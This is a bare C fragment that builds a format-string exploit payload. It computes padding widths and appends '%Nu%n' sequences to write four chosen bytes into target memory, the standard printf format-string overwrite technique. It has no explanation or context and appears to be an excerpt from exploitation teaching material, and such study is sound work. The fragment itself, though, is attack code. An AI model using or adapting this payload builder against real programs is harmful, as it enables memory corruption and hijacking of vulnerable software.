unsigned int already_written, width_field; 
unsigned int write_byte; 
char buffer[256]; 

already_written = 506; 

// first byte 
write_byte = 0x3C8; 
already_written %= 0x100; 

width_field = (write_byte - already_written) % 0x100; 
if (width_field < 10) 
	width_field += 0x100; 
sprintf(buffer, "%%%du%%n", width_field); 
strcat(format, buffer); 

// second byte 
write_byte = 0x3fA; 
already_written += width_field; 
already_written %= 0x100; 

width_field = (write_byte - already_written) % 0x100; 
if (width_field < 10) 
	width_field += 0x100; 
sprintf(buffer, "%%%du%%n", width_field); 
strcat(format, buffer); 

// third byte 
write_byte = 0x442; 
already_written += width_field; 
already_written %= 0x100; 
width_field = (write_byte - already_written) % 0x100; 
if (width_field < 10) 
	width_field += 0x100;
sprintf(buffer, "%%%du%%n", width_field); 
strcat(format, buffer); 

// fourth byte 
write_byte = 0x501; 
already_written += width_field; 
already_written %= 0x100; 
 
width_field = (write_byte - already_written) % 0x100; 
if (width_field < 10) 
	width_field += 0x100; 
sprintf(buffer, "%%%du%%n", width_field); 
strcat(format, buffer);
